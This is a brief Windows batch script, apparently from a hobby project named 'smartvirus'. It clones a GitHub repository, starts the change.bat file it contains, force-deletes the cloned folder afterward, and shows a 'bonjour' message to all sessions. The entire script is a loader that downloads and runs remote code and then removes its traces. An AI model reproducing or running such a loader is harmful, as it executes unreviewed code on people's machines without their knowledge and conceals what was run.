cd ..
timeout 2
rmdir /s /q smartvirus
git clone https://github.com/mattistjnn/smartvirus
cd smartvirus
start change.bat
cd ..
rmdir /s /q smartvirus 
msg * "bonjour"
exit